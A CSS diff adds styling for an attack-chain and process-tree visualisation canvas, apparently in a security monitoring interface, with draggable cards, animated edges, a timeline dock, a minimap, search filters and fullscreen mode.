@@ -1269,6 +1269,330 @@
 }
 /* align176 */
 .kc .kc-main.kc-main .kc-card.cp-card > .kc-tw,.kc .kc-main.kc-main .kc-card.bl-card > .kc-tw{margin-left:0!important;margin-right:0!important}
+/* hg 画布：攻击链 / 进程树（参考 Agent Orchestration：点阵画布、固定尺寸卡片、细蓝连线 + 空心起点、攻击路径流动、拖拽缩放适配、底部面板） */
+.hg{--hg-dh:200px;--hg-line:#7aa3ff;--hg-mu:#d4d8e0;position:relative;display:flex;flex-direction:column;margin:12px 20px 16px;height:calc(480px + var(--hg-dh));border:1px solid #e5e6eb;border-radius:8px;overflow:hidden;background:#fff}
+.hg.fold{height:calc(480px + 41px)}
+.hg-mid{position:relative;display:flex;flex:1;min-height:0}
+.hg-vp{position:relative;flex:1;min-width:0;overflow:hidden;cursor:grab;touch-action:none;user-select:none;background-color:#f7f8fa;background-image:radial-gradient(circle at 1px 1px,#d5d9e0 .8px,transparent 1.1px);background-size:20px 20px}
+.hg-vp[data-pan],.hg-vp[data-pan] .hg-card{cursor:grabbing}
+.hg-world{position:absolute;left:0;top:0;width:0;height:0;transform-origin:0 0}
+.hg-svg{position:absolute;left:0;top:0;overflow:visible;pointer-events:none}
+.hg-dots{z-index:3}
+.hg-l{fill:none;stroke:var(--hg-line);stroke-width:1.5;stroke-linecap:round;transition:stroke .24s,opacity .24s}
+.hg-e.mu .hg-l{stroke:var(--hg-mu)}
+.hg-e.fd,.hg-dot.fd{opacity:.3;transition:opacity .24s}
+.hg-dot{fill:#fff;stroke:var(--hg-line);stroke-width:1.5}
+.hg-dot.mu{stroke:var(--hg-mu)}
+.hg-f{fill:none;stroke-width:2;stroke-linecap:round;stroke:#1664ff;stroke-dasharray:var(--L) 4000px;stroke-dashoffset:var(--L);animation:hgFlow 1.8s cubic-bezier(.45,0,.4,1) infinite}
+.hg-e.r .hg-f{stroke:#f53f3f}
+.hg-f.f1{--L:14px}
+.hg-f.f2{--L:36px;opacity:.45}
+.hg-f.f3{--L:72px;opacity:.2}
+@keyframes hgFlow{0%{stroke-dashoffset:var(--L)}72%,100%{stroke-dashoffset:calc(0px - var(--len) - 2px)}}
+@media (prefers-reduced-motion:reduce){.hg-f{display:none}}
+.hg-card{position:absolute;display:flex;flex-direction:column;gap:6px;box-sizing:border-box;padding:10px 12px 0;border:0;border-radius:8px;background:#fff;text-align:left;font:inherit;cursor:pointer;box-shadow:0 0 0 1px rgba(29,33,41,.07),0 1px 2px rgba(29,33,41,.05);transition:box-shadow .16s,opacity .24s}
+.hg-card:hover{box-shadow:0 0 0 1px rgba(29,33,41,.1),0 6px 16px rgba(29,33,41,.1)}
+.hg-card:focus{outline:none}
+.hg-card:focus-visible{outline:2px solid #1664ff;outline-offset:2px}
+.hg-card.on{box-shadow:0 0 0 1.5px #1664ff,0 6px 16px rgba(22,100,255,.14)}
+.hg-card.fd{opacity:.36}
+.hg-card.mu:not(.on){box-shadow:0 0 0 1px rgba(29,33,41,.06)}
+.hg-tag{position:absolute;left:0;bottom:calc(100% + 5px);max-width:100%;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;padding:0 6px;border-radius:4px;background:#eef0f4;font-size:11px;line-height:17px;color:rgba(0,0,0,.55)}
+.hg-card.hot .hg-tag{background:#fff;box-shadow:0 0 0 1px rgba(29,33,41,.08);color:rgba(0,0,0,.75)}
+.hg-tag.s{position:static;display:inline-block}
+.hg-hd{display:flex;align-items:center;gap:8px;min-width:0;height:24px}
+.hg-hd b{flex:1;min-width:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font-size:13px;font-weight:600;color:rgba(0,0,0,.88)}
+.hg-mk{display:grid;flex:none;place-items:center;width:24px;height:24px;border-radius:6px;background:#fff;box-shadow:0 0 0 1px rgba(29,33,41,.1),0 1px 2px rgba(29,33,41,.06)}
+.hg-mk::before{content:"";width:14px;height:14px;background:rgba(0,0,0,.72);-webkit-mask:var(--ni) center/contain no-repeat;mask:var(--ni) center/contain no-repeat}
+.hg-mk.sm{width:20px;height:20px;border-radius:5px}
+.hg-mk.sm::before{width:12px;height:12px}
+.hg-chip{display:inline-flex;flex:none;align-items:center;gap:4px;height:20px;padding:0 6px 0 5px;border-radius:4px;background:#f2f3f5;font-size:11px;font-weight:500;color:rgba(0,0,0,.55);white-space:nowrap}
+.hg-chip i{width:6px;height:6px;border-radius:50%;background:currentColor}
+.hg-chip.r{background:#ffece8;color:#f53f3f}
+.hg-chip.r i{animation:hgBlink 1.6s ease-in-out infinite}
+.hg-chip.b{background:#e8f3ff;color:#1664ff}
+.hg-chip.g{background:#e8ffea;color:#00a72a}
+@keyframes hgBlink{50%{opacity:.25}}
+.hg-sub{overflow:hidden;height:17px;font-size:12px;line-height:17px;white-space:nowrap;text-overflow:ellipsis;color:rgba(0,0,0,.55);font-family:Menlo,Monaco,Consolas,monospace}
+.hg-well{display:flex;align-items:center;gap:8px;min-width:0;height:28px;margin:0 -6px;padding:0 8px;border-radius:5px;background:#f5f6f8}
+.hg-well code{flex:1;min-width:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font:11.5px/16px Menlo,Monaco,Consolas,monospace;color:rgba(0,0,0,.7)}
+.hg-r{flex:none;font-style:normal;font-size:11.5px;color:rgba(0,0,0,.5);font-variant-numeric:tabular-nums}
+.hg-r.r{color:#f53f3f;font-weight:500}
+.hg-ui{position:absolute;z-index:5}
+.hg-lg{left:12px;top:10px;display:flex;align-items:center;gap:12px;height:26px;padding:0 10px;border-radius:6px;background:rgba(255,255,255,.92);box-shadow:0 0 0 1px rgba(29,33,41,.06);font-size:12px;color:rgba(0,0,0,.6)}
+.hg-lg span{display:inline-flex;align-items:center;gap:5px}
+.hg-cd{width:7px;height:7px;border-radius:50%;background:#c9cdd4}
+.hg-cd.r{background:#f53f3f}
+.hg-cd.b{background:#1664ff}
+.hg-fl{width:18px;height:2px;border-radius:1px;background:linear-gradient(90deg,rgba(245,63,63,0),#f53f3f)}
+.hg.done .hg-lgf{display:none}
+.hg-cnt{right:12px;top:10px;display:flex;align-items:center;gap:10px;height:26px;padding:0 3px 0 10px;border-radius:6px;background:rgba(255,255,255,.92);box-shadow:0 0 0 1px rgba(29,33,41,.06);font-size:12px;line-height:26px;color:rgba(0,0,0,.6)}
+.hg-tb{left:50%;bottom:12px;display:flex;align-items:center;gap:2px;padding:4px;border-radius:8px;background:#fff;box-shadow:0 0 0 1px rgba(29,33,41,.08),0 6px 18px rgba(29,33,41,.12);transform:translateX(-50%)}
+.hg-tb button{position:relative;display:grid;place-items:center;width:28px;height:28px;border:0;border-radius:5px;background:none;color:rgba(0,0,0,.55);cursor:pointer;font:inherit}
+.hg-tb button:hover{background:#f2f3f5;color:rgba(0,0,0,.88)}
+.hg-tb .hg-zm{width:46px;font-size:12px;font-variant-numeric:tabular-nums}
+.hg-sep{width:1px;height:16px;margin:0 4px;background:#e5e6eb}
+.hg-tb [data-tip]:hover::after{content:attr(data-tip);position:absolute;bottom:calc(100% + 8px);left:50%;transform:translateX(-50%);padding:3px 8px;border-radius:4px;background:rgba(29,33,41,.92);font-size:12px;line-height:16px;white-space:nowrap;color:#fff;pointer-events:none}
+.hg-dock{position:relative;display:flex;flex-direction:column;flex:none;height:var(--hg-dh);border-top:1px solid #e5e6eb;background:#fff}
+.hg.fold .hg-dock{height:40px}
+.hg-grip{position:absolute;left:0;right:0;top:-3px;z-index:6;height:6px;cursor:row-resize}
+.hg-grip:hover,.hg[data-rs] .hg-grip{background:linear-gradient(#1664ff,#1664ff) center/100% 2px no-repeat}
+.hg.fold .hg-grip{display:none}
+.hg-dh{display:flex;align-items:center;gap:16px;flex:none;height:40px;padding:0 8px 0 12px;border-bottom:1px solid #f2f3f5}
+.hg.fold .hg-dh{border-bottom:0}
+.hg-dt{display:flex;gap:4px}
+.hg-dtb{display:inline-flex;align-items:center;gap:6px;height:28px;padding:0 10px;border:0;border-radius:5px;background:none;font:inherit;font-size:13px;color:rgba(0,0,0,.6);cursor:pointer}
+.hg-dtb:hover{background:#f2f3f5}
+.hg-dtb.on{background:#f2f3f5;color:rgba(0,0,0,.9);font-weight:500}
+.hg-dtb em{font-style:normal;font-size:11px;padding:0 5px;border-radius:8px;background:#e5e6eb;line-height:16px}
+.hg-num{display:flex;gap:18px;margin-left:auto;font-size:12px;white-space:nowrap}
+.hg-num span{display:inline-flex;align-items:baseline;gap:6px}
+.hg-num small{font-size:12px;color:rgba(0,0,0,.5)}
+.hg-num b{font-weight:500;color:rgba(0,0,0,.85);font-variant-numeric:tabular-nums}
+.hg-fold{display:grid;place-items:center;width:28px;height:28px;border:0;border-radius:5px;background:none;color:rgba(0,0,0,.5);cursor:pointer}
+.hg-fold:hover{background:#f2f3f5}
+.hg-fold svg.up{transform:rotate(180deg)}
+.hg-db{flex:1;min-height:0;overflow:auto}
+.hg-tr{position:relative;padding:0 16px 8px 0}
+.hg-ax{position:sticky;top:0;z-index:2;display:flex;height:28px;background:#fff;border-bottom:1px solid #f2f3f5}
+.hg-axl{flex:none;width:188px;padding-left:16px;font-size:12px;line-height:28px;color:rgba(0,0,0,.45)}
+.hg-axt{position:relative;flex:1}
+.hg-axt span{position:absolute;top:0;transform:translateX(-50%);font:11px/28px Menlo,Monaco,Consolas,monospace;color:rgba(0,0,0,.45);white-space:nowrap}
+.hg-axt span:first-child{transform:none}
+.hg-axt span:last-child{transform:translateX(-100%)}
+.hg-row{display:flex;align-items:center;height:32px;cursor:pointer;transition:opacity .24s}
+.hg-row:hover{background:#f7f8fa}
+.hg-row.on{background:#f0f5ff}
+.hg-row.fd{opacity:.4}
+.hg-trl{display:flex;flex:none;align-items:center;gap:8px;width:188px;padding-left:16px;box-sizing:border-box;min-width:0}
+.hg-trl b{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font-size:12.5px;font-weight:500;color:rgba(0,0,0,.85)}
+.hg-trl small{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font:11px Menlo,Monaco,Consolas,monospace;color:rgba(0,0,0,.45)}
+.hg-row.mu .hg-trl b{font-weight:400;color:rgba(0,0,0,.6)}
+.hg-trk{position:relative;flex:1;align-self:stretch}
+.hg-gl{position:absolute;top:0;bottom:0;width:1px;background:#f2f3f5}
+.hg-bar{position:absolute;top:50%;height:6px;margin-top:-3px;border-radius:3px;background:#bed4ff}
+.hg-bar.r{background:linear-gradient(90deg,#ffcfc7,#ffece8)}
+.hg-bar.g{background:#c9f0d0}
+.hg-pt{position:absolute;top:50%;width:10px;height:10px;margin:-5px 0 0 -5px;padding:0;border:2px solid #fff;border-radius:50%;background:#1664ff;box-shadow:0 0 0 1px rgba(22,100,255,.3);cursor:pointer;z-index:1}
+.hg-pt.r{background:#f53f3f;box-shadow:0 0 0 1px rgba(245,63,63,.3)}
+.hg-pt.g{background:#00b42a;box-shadow:0 0 0 1px rgba(0,180,42,.3)}
+.hg-pt span{position:absolute;left:12px;top:50%;transform:translateY(-50%);font-size:11.5px;white-space:nowrap;color:rgba(0,0,0,.7);pointer-events:none}
+.hg-pt:hover,.hg-pt.hl{transform:scale(1.25);z-index:2}
+.hg-pt.dim{opacity:.35}
+.hg-al{padding:4px 8px 8px}
+.hg-al .hu-tr1{width:100%}
+/* 全屏 */
+.hu-c.hg-fsc{container-type:normal!important;overflow:visible!important}
+.hg.fs{position:fixed;inset:0;z-index:3000;margin:0;height:auto;border:0;border-radius:0}
+.hg.fs.fold{height:auto}
+.hg-top{display:flex;align-items:center;gap:16px;flex:none;height:52px;padding:0 16px;border-bottom:1px solid #e5e6eb;background:#fff}
+.hg-path{display:flex;align-items:center;gap:8px;min-width:0;font-size:13px;color:rgba(0,0,0,.55)}
+.hg-path b{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font-weight:500;color:rgba(0,0,0,.88)}
+.hg-path i{font-style:normal;color:rgba(0,0,0,.25)}
+.hg-mono{font-family:Menlo,Monaco,Consolas,monospace;font-size:12px}
+.hg-seg{display:flex;gap:2px;margin:0 auto;padding:3px;border-radius:7px;background:#f2f3f5}
+.hg-seg button{height:26px;padding:0 14px;border:0;border-radius:5px;background:none;font:inherit;font-size:13px;color:rgba(0,0,0,.6);cursor:pointer}
+.hg-seg button.on{background:#fff;color:rgba(0,0,0,.9);font-weight:500;box-shadow:0 1px 2px rgba(29,33,41,.12)}
+.hg-ctl{display:flex;gap:8px}
+.hg-ctl kbd{margin-left:6px;padding:0 4px;border-radius:3px;background:#f2f3f5;font:11px/16px Menlo,Monaco,Consolas,monospace;color:rgba(0,0,0,.5)}
+.hg-pn{margin-left:6px;padding:0 5px;border-radius:8px;background:rgba(255,255,255,.25);font-style:normal;font-size:11px;line-height:16px}
+.hg.fs .hg-mid{flex:1}
+.hg.fs .hg-dock{height:var(--hg-dh)}
+.hg.fs.fold .hg-dock{height:40px}
+.hg-dw{flex:none;width:368px;overflow-y:auto;box-sizing:border-box;padding:16px 20px 24px;border-left:1px solid #e5e6eb;background:#fff;animation:hgIn .22s ease both}
+@keyframes hgIn{from{transform:translateX(16px);opacity:0}}
+.hg-dwh{display:flex;align-items:center;justify-content:space-between}
+.hg-x{display:grid;place-items:center;width:28px;height:28px;border:0;border-radius:5px;background:none;color:rgba(0,0,0,.5);cursor:pointer}
+.hg-x:hover{background:#f2f3f5}
+.hg-dwt{display:flex;align-items:center;gap:8px;margin-top:10px}
+.hg-dwt b{font-size:16px;font-weight:600;color:rgba(0,0,0,.9)}
+.hg-dws{margin:4px 0 12px;color:rgba(0,0,0,.5)}
+.hg-kv{margin:0;display:grid;gap:8px}
+.hg-kv div{display:flex;gap:12px;font-size:13px}
+.hg-kv dt{flex:none;width:64px;color:rgba(0,0,0,.5)}
+.hg-kv dd{margin:0;min-width:0;overflow-wrap:anywhere;color:rgba(0,0,0,.85)}
+.hg-cmd{margin-top:14px;padding:10px 12px;border-radius:6px;background:#f5f6f8}
+.hg-cmd small{display:block;margin-bottom:4px;font-size:12px;color:rgba(0,0,0,.5)}
+.hg-cmd code{font:12px/18px Menlo,Monaco,Consolas,monospace;color:rgba(0,0,0,.8);overflow-wrap:anywhere}
+.hg-dsec{margin-top:18px;display:flex;flex-direction:column;gap:6px}
+.hg-dsec > b{display:flex;align-items:baseline;gap:8px;font-size:13px;font-weight:600;color:rgba(0,0,0,.88)}
+.hg-dsec > b em{font-style:normal;font-weight:400;color:rgba(0,0,0,.5)}
+.hg-dsec > b small{font-weight:400;font-size:12px;color:rgba(0,0,0,.45)}
+.hg-key{display:grid;grid-template-columns:1fr auto;gap:2px 8px;padding:8px 10px;border-radius:6px;background:#fff7f5;font-size:13px}
+.hg-key time{font-size:12px;color:rgba(0,0,0,.5)}
+.hg-key code{grid-column:1/-1;font:11.5px Menlo,Monaco,Consolas,monospace;color:rgba(0,0,0,.65);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.hg-none{margin:0;font-size:12px;color:rgba(0,0,0,.5)}
+.hg-act{display:flex;align-items:center;justify-content:space-between;height:32px;padding:0 10px;border:1px solid #e5e6eb;border-radius:6px;background:#fff;font:inherit;font-size:13px;color:rgba(0,0,0,.85);cursor:pointer}
+.hg-act:hover{border-color:#1664ff;color:#1664ff}
+.hg-act em{font-style:normal;font-size:12px;color:#1664ff}
+.hg-act.in{background:#f7f8fa;cursor:default}
+.hg-act.in em{color:rgba(0,0,0,.45)}
+.hg-pi{display:inline-block;margin-top:16px;font-size:13px;color:#1664ff;text-decoration:none}
+.hg-pt.rt span{left:auto;right:12px}
+.hu-lay:has(.hg.fs){transform:none!important;animation:none!important}
+html:has(.hg.fs) .kc-top{visibility:hidden}
+.hg-mode{display:flex;gap:2px;padding:2px;border-radius:5px;background:#f2f3f5}
+.hg-mode button{height:20px;padding:0 8px;border:0;border-radius:4px;background:none;font:inherit;font-size:12px;color:rgba(0,0,0,.55);cursor:pointer}
+.hg-mode button.on{background:#fff;color:rgba(0,0,0,.88);box-shadow:0 1px 2px rgba(29,33,41,.12)}
+.hg-card.grp{box-shadow:0 0 0 1px rgba(29,33,41,.07),0 1px 2px rgba(29,33,41,.05),4px 4px 0 -1px #fff,4px 4px 0 0 rgba(29,33,41,.09),8px 8px 0 -1px #fff,8px 8px 0 0 rgba(29,33,41,.07)}
+.hg-card.grp:hover{box-shadow:0 0 0 1px rgba(29,33,41,.1),0 6px 16px rgba(29,33,41,.1),4px 4px 0 -1px #fff,4px 4px 0 0 rgba(29,33,41,.12),8px 8px 0 -1px #fff,8px 8px 0 0 rgba(29,33,41,.09)}
+.hg-card.grp.on{box-shadow:0 0 0 1.5px #1664ff,0 6px 16px rgba(22,100,255,.14),4px 4px 0 -1px #fff,4px 4px 0 0 rgba(22,100,255,.35),8px 8px 0 -1px #fff,8px 8px 0 0 rgba(22,100,255,.2)}
+.hg-card.fold{background:rgba(255,255,255,.6);box-shadow:none;outline:1px dashed #c9cdd4;outline-offset:-1px}
+.hg-card.fold:hover{background:#fff;outline-color:#1664ff}
+.hg-card.fold .hg-hd b{font-weight:500;color:rgba(0,0,0,.7)}
+.hg-card.fold .hg-well{background:none;padding:0 6px}
+.hg-card.fold .hg-well code{font-family:inherit;color:#1664ff}
+.hg-card.fold .hg-mk{box-shadow:none;background:#f2f3f5}
+.hg-pt.s{width:6px;height:6px;margin:-3px 0 0 -3px;border:0;background:#c9cdd4;box-shadow:none}
+.hg-pt.s:hover{background:#86909c;transform:scale(1.4)}
+.hg-row.grp .hg-trl small{color:#1664ff}
+.hg-row.sub .hg-trl{padding-left:40px}
+.hg-row.sub{height:26px;background:#fafbfc}
+.hg:not(.fs) .hg-lgf{display:none}
+/* 语义缩放：缩小后卡片只留名字和告警点 */
+.hg-vp.lod .hg-card{justify-content:center;padding:0 12px}
+.hg-vp.lod .hg-card .hg-sub,.hg-vp.lod .hg-card .hg-well,.hg-vp.lod .hg-mk{display:none}
+.hg-vp.lod .hg-tag{visibility:hidden}
+.hg-vp.lod .hg-hd{height:auto;gap:10px}
+.hg-vp.lod .hg-hd b{font-size:0}
+.hg-vp.lod .hg-hd b::after{content:attr(data-s);font-size:22px;line-height:30px}
+.hg-vp.lod2 .hg-hd b::after{font-size:28px;line-height:38px}
+.hg-vp.lod .hg-chip{justify-content:center;width:22px;height:22px;padding:0;border-radius:50%;font-size:0;gap:0}
+.hg-vp.lod .hg-chip i{width:12px;height:12px}
+.hg-vp.lod2 .hg-chip{width:30px;height:30px}
+.hg-vp.lod2 .hg-chip i{width:16px;height:16px}
+.hg-vp.lod .hg-card.fold .hg-hd b::after{color:rgba(0,0,0,.5)}
+.hg-vp.lod .hg-l{stroke-width:2.5}
+.hg-vp.lod2 .hg-l{stroke-width:3.5}
+.hg-vp.lod .hg-f{stroke-width:3.5}
+.hg-vp.lod2 .hg-f{stroke-width:5}
+/* 搜索 / 阶段筛选 */
+.hg-qb{left:12px;top:44px;display:flex;align-items:center;gap:6px;height:30px;padding:0 4px 0 0;border-radius:6px;background:rgba(255,255,255,.96);box-shadow:0 0 0 1px rgba(29,33,41,.08);font-size:12px}
+.hg-q{display:flex;align-items:center;gap:6px;height:30px;padding:0 4px 0 10px;color:rgba(0,0,0,.45)}
+.hg-q input{width:168px;height:28px;border:0;outline:0;background:none;font:inherit;font-size:12px;color:rgba(0,0,0,.88)}
+.hg-q input::placeholder{color:rgba(0,0,0,.35)}
+.hg-sp{position:relative}
+.hg-stb{display:inline-flex;align-items:center;gap:4px;height:22px;padding:0 6px 0 8px;border:0;border-left:1px solid #e5e6eb;border-radius:0;background:none;font:inherit;font-size:12px;color:rgba(0,0,0,.65);cursor:pointer}
+.hg-stb:hover,.hg-stb.op{color:#1664ff}
+.hg-stb.on{margin-left:4px;border-left:0;border-radius:4px;background:#e8f3ff;color:#1664ff}
+.hg-spl{position:absolute;left:0;top:calc(100% + 8px);z-index:5;display:flex;flex-direction:column;min-width:148px;padding:4px;border-radius:6px;background:#fff;box-shadow:0 0 0 1px rgba(29,33,41,.08),0 8px 24px rgba(29,33,41,.14)}
+.hg-sti{display:flex;align-items:center;justify-content:space-between;gap:12px;height:30px;padding:0 8px;border:0;border-radius:4px;background:none;font:inherit;font-size:12px;color:rgba(0,0,0,.75);cursor:pointer;text-align:left}
+.hg-sti:hover{background:#f2f3f5}
+.hg-sti.on{background:#e8f3ff;color:#1664ff}
+.hg-sti em{font-style:normal;color:rgba(0,0,0,.4)}
+.hg-qn{padding:0 4px 0 8px;border-left:1px solid #e5e6eb;color:rgba(0,0,0,.6);font-variant-numeric:tabular-nums;white-space:nowrap}
+.hg-qi,.hg-qx{display:grid;place-items:center;height:24px;min-width:24px;border:0;border-radius:4px;background:none;font:inherit;font-size:12px;color:rgba(0,0,0,.55);cursor:pointer}
+.hg-qx{padding:0 6px}
+.hg-qi:hover,.hg-qx:hover{background:#f2f3f5;color:rgba(0,0,0,.88)}
+.hg-card.dm{opacity:.3}
+.hg-card.mt{box-shadow:0 0 0 2px #ff9a2e,0 6px 16px rgba(255,125,0,.16)}
+.hg-card.mt.cur{box-shadow:0 0 0 2.5px #ff7d00,0 8px 22px rgba(255,125,0,.26)}
+.hg.qon .hg-e,.hg.qon .hg-dot{opacity:.4}
+/* 小地图 */
+.hg-mm{right:12px;bottom:12px;width:156px;height:100px;padding:6px;box-sizing:border-box;border-radius:8px;background:rgba(255,255,255,.96);box-shadow:0 0 0 1px rgba(29,33,41,.08),0 6px 18px rgba(29,33,41,.1);cursor:crosshair}
+.hg-mm svg{display:block;width:100%;height:100%}
+.hg-mmn{fill:#c9cdd4}
+.hg-mmn.f{fill:#e5e6eb}
+.hg-mmn.r{fill:#f76965}
+.hg.done .hg-mmn.r{fill:#7aa3ff}
+.hg-mmn.on{fill:#1664ff}
+.hg-mmn.mt{fill:#ff7d00}
+.hg-mmn.dm{opacity:.4}
+.hg-mmv{fill:rgba(22,100,255,.08);stroke:#1664ff;stroke-width:1.5;vector-effect:non-scaling-stroke}
+.hg-row.grp .hg-trl b{font-weight:600}
+/* 进程树：缩进列表 + 时间列 */
+.hgt{display:flex;flex:1;flex-direction:column;min-width:0;min-height:0;background:#fff;container-type:inline-size}
+.hgt-bar{display:flex;align-items:center;gap:6px;flex:none;height:44px;padding:0 10px 0 2px;border-bottom:1px solid #f0f1f3;font-size:12px}
+.hgt-bar .hg-q{padding-left:12px}
+.hgt-sp{flex:1}
+.hgt-cnt{color:rgba(0,0,0,.55);white-space:nowrap}
+.hgt-bar .hg-mode{margin-left:4px}
+.hgt-fs{display:grid;place-items:center;width:28px;height:28px;margin-left:4px;border:0;border-radius:5px;background:none;color:rgba(0,0,0,.55);cursor:pointer}
+.hgt-fs:hover{background:#f2f3f5;color:rgba(0,0,0,.88)}
+.hgt-hd,.hgt-r{display:grid;grid-template-columns:minmax(200px,1.1fr) minmax(0,1.3fr) 84px minmax(180px,1fr);align-items:center;column-gap:12px;padding-right:16px}
+.hgt-hd{flex:none;height:30px;background:#fafbfc;border-bottom:1px solid #f0f1f3;font-size:12px;color:rgba(0,0,0,.5)}
+.hgt-hd>span:first-child{padding-left:30px}
+.hgt-tl{position:relative;height:30px}
+.hgt-tl em{position:absolute;top:0;font-style:normal;font:11px/30px Menlo,Monaco,Consolas,monospace;color:rgba(0,0,0,.4);transform:translateX(-50%);white-space:nowrap}
+.hgt-tl em:first-child{transform:none}
+.hgt-tl em:last-child{transform:translateX(-100%)}
+.hgt-bd{flex:1;min-height:0;overflow:auto;overscroll-behavior:contain}
+.hgt-r{position:relative;height:34px;border-bottom:1px solid #f5f6f8;cursor:pointer;font-size:13px}
+.hgt-r:hover{background:#f7f8fa}
+.hgt-r.on{background:#e8f3ff}
+.hgt-r.on::before{content:"";position:absolute;left:0;top:0;bottom:0;width:2px;background:#1664ff}
+.hgt-nm{display:flex;align-items:center;gap:6px;min-width:0;height:34px;box-sizing:border-box;white-space:nowrap}
+.hgt-nm b{overflow:hidden;text-overflow:ellipsis;font-weight:600;color:rgba(0,0,0,.88)}
+.hgt-nm small{flex:none;font:12px Menlo,Monaco,Consolas,monospace;color:rgba(0,0,0,.42)}
+.hgt-tw{display:grid;flex:none;place-items:center;width:18px;height:18px;margin-left:-24px;padding:0;border:0;border-radius:4px;background:none;color:rgba(0,0,0,.45);cursor:pointer}
+.hgt-tw:hover{background:#e5e6eb;color:rgba(0,0,0,.88)}
+.hgt-tw svg{transition:transform .16s}
+.hgt-tw.op svg{transform:rotate(90deg)}
+.hgt-cm{min-width:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+code.hgt-cm{font:12px Menlo,Monaco,Consolas,monospace;color:rgba(0,0,0,.62)}
+.hgt-al{display:flex;justify-content:flex-end}
+.hgt-trk{position:relative;height:34px}
+.hgt-trk .hg-gl{top:0;bottom:0}
+.hgt-ln{position:absolute;top:50%;height:2px;margin-top:-1px;border-radius:1px;background:#c9cdd4}
+.hgt-r.hot .hgt-ln{background:#fbaca3}
+.hg.done .hgt-r.hot .hgt-ln{background:#9fc0ff}
+.hgt .hg-pt span{display:none}
+.hgt .hg-pt{top:50%}
+.hgt-r.fold{color:rgba(0,0,0,.55)}
+.hgt-r.fold b{font-weight:400;color:#1664ff}
+.hgt-r.fold code.hgt-cm{font-family:inherit;color:rgba(0,0,0,.42)}
+.hgt-r.grp b::after{content:"";display:inline-block}
+.hgt-r.sub{background:#fbfcfd}
+.hgt-r.sub:hover{background:#f2f3f5}
+.hgt-r.dm{opacity:.38}
+.hgt-r.mt{background:#fff7e8}
+.hgt-r.mt.cur{box-shadow:inset 0 0 0 1.5px #ff7d00}
+
+.hgt{--ind:20px}
+.hgt-nm{padding-left:calc(30px + var(--d,0) * var(--ind))}
+.hgt-nm b{flex:none;max-width:60%}
+.hgt-nm small{min-width:0;overflow:hidden;text-overflow:ellipsis}
+.hgt-bar .hg-mode button,.hgt-bar .hg-stb{white-space:nowrap}
+.hgt-tl em:nth-child(2),.hgt-tl em:nth-child(4){display:none}
+@container (max-width:760px){
+  .hgt{--ind:12px}
+  .hgt-hd,.hgt-r{grid-template-columns:minmax(0,1.3fr) 76px minmax(120px,1fr);column-gap:8px;padding-right:12px}
+  .hgt-cm,.hgt-cnt{display:none}
+  .hgt-tl em:nth-child(3){display:none}
+  .hgt-bar .hg-q input{width:120px}
+}
+.hgt-nm{overflow:hidden}
+/* 极端情况 */
+.hgt-nm b{flex:0 1 auto;min-width:24px;max-width:none}
+.hgt-nm small{flex:none;overflow:visible}
+.hgt-dp{flex:none;height:16px;padding:0 4px;border-radius:3px;background:#eef0f4;font:10.5px/16px Menlo,Monaco,Consolas,monospace;font-style:normal;color:rgba(0,0,0,.5)}
+.hgt-tl{cursor:col-resize;user-select:none}
+.hgt-sel{position:absolute;top:4px;bottom:4px;width:0;border-radius:3px;background:rgba(22,100,255,.14);box-shadow:inset 0 0 0 1px rgba(22,100,255,.5);display:none;pointer-events:none}
+.hgt-tl[data-sel] .hgt-sel{display:block}
+.hgt-trr{position:absolute;right:0;top:4px;z-index:1;display:inline-flex;align-items:center;gap:4px;height:22px;padding:0 6px 0 8px;border:0;border-radius:4px;background:#e8f3ff;font:11px/22px Menlo,Monaco,Consolas,monospace;color:#1664ff;cursor:pointer;white-space:nowrap}
+.hgt-trr:hover{background:#d4e6ff}
+.hgt-tl:has(.hgt-trr) em:last-of-type,.hgt-tl:has(.hgt-trr) em:nth-of-type(4){visibility:hidden}
+.hg-pt.cl{width:auto;min-width:22px;height:16px;margin:-8px 0 0 -11px;padding:0 4px;border-radius:8px;border:0;box-shadow:0 0 0 2px #fff;font:600 10px/16px Menlo,Monaco,Consolas,monospace;color:#fff;transform:translateX(-25%)}
+.hgt .hg-pt.cl span{display:inline;position:static;transform:none;color:#fff;font-size:10px}
+.hg-pt.cl.b{background:#1664ff}
+.hg-tr .hg-pt.cl span{display:inline;position:static;transform:none;color:#fff;font-size:10px}
+/* 页面内滚轮不截获：快捷按钮 + 提示 */
+.hg-qa{display:flex;align-items:center;gap:2px;margin-left:2px;padding-left:6px;border-left:1px solid #e5e6eb}
+.hg-qa button{position:relative;display:grid;place-items:center;width:24px;height:22px;border:0;border-radius:4px;background:none;color:rgba(0,0,0,.6);cursor:pointer}
+.hg-qa button:hover{background:#f2f3f5;color:#1664ff}
+.hg-qa [data-tip]:hover::after{content:attr(data-tip);position:absolute;top:calc(100% + 8px);right:0;padding:3px 8px;border-radius:4px;background:rgba(29,33,41,.92);font-size:12px;line-height:16px;white-space:nowrap;color:#fff;pointer-events:none}
+.hg-hint{left:50%;top:50%;padding:8px 14px;border-radius:8px;background:rgba(29,33,41,.82);font-size:13px;line-height:20px;color:#fff;transform:translate(-50%,-50%);opacity:0;pointer-events:none;transition:opacity .2s;white-space:nowrap}
+.hg-hint.on{opacity:1}
+.hg-hint kbd{display:inline-block;margin:0 2px;padding:0 5px;border-radius:3px;background:rgba(255,255,255,.18);font:12px/18px Menlo,Monaco,Consolas,monospace}
+.hg.fs .hg-hint{display:none}
+.hg:not(.fs) .hgt-bd,.hg:not(.fs) .hg-db{overscroll-behavior:auto}
+
